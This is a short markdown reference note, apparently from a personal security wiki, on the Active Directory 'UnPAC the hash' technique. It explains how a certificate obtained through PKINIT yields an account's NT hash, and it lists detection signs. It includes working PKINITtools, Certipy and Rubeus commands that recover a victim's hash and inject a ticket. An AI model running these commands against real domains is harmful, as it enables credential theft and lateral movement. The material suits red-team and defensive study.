---
title: PKINIT and UnPAC the Hash
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, kerberos, credential-access, pkinit]
source: raw/pkinit_unpac_the_hash.md
---

# PKINIT and UnPAC the Hash

> Source: `raw/pkinit_unpac_the_hash.md` (thehacker.recipes)

## Summary

PKINIT is certificate-based Kerberos pre-auth (vs. the normal
password-derived-key pre-auth). When a TGT is issued via PKINIT, the KDC
embeds the account's NT hash in a `PAC_CREDENTIAL_INFO` structure (for NTLM
fallback). "UnPAC the hash" recovers that NT hash via an S4U2Self +
User-to-User TGS-REQ, turning "I have a cert/private key for this account"
into "I have its NT hash." This is the mechanism that makes
[[shadow-credentials]] and AD CS cert-based attacks ([[ad-cs-esc-attacks]])
so impactful. See [[pkinit-unpac-the-hash]] (concept) for the protocol hub.

## Key points

- **Requires**: a private key for the target (via cert theft,
  [[shadow-credentials]], or "Golden Certificate" CA-key forgery), PKINIT
  support (DC 2016+, AD CS).
- **Tooling**: PKINITtools `gettgtpkinit.py` → `getnthash.py`; Rubeus
  `/getcredentials`; Certipy `auth`.
- **Outcome**: recovered NT hash enables [[pass-the-hash-and-ticket]],
  [[golden-silver-tickets|Silver Tickets]], and further
  [[kerberos-delegation-abuse]].
- **Detection**: certificate-based 4768 pre-auth + anomalous S4U2Self from
  non-service accounts; `msDS-KeyCredentialLink` writes.

## Commands

```bash
# PKINITtools — get a TGT via a certificate (PFX), then UnPAC the hash
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass "" corp.local/victimuser victim.ccache
export KRB5CCNAME=victim.ccache
python3 getnthash.py -key <session_key_from_gettgtpkinit_output> corp.local/victimuser
```

```bash
# Certipy — equivalent, one command does both auth + UnPAC
certipy auth -pfx victim.pfx -domain corp.local -dc-ip <dc-ip>
# Output includes: NT hash, and writes a .ccache for Kerberos use
```

```powershell
# Rubeus — request TGT via PKINIT cert and recover NT hash directly
Rubeus.exe asktgt /user:victimuser /certificate:<base64 PFX> /password:"" /domain:corp.local /dc:dc01.corp.local /getcredentials /show /ptt
```
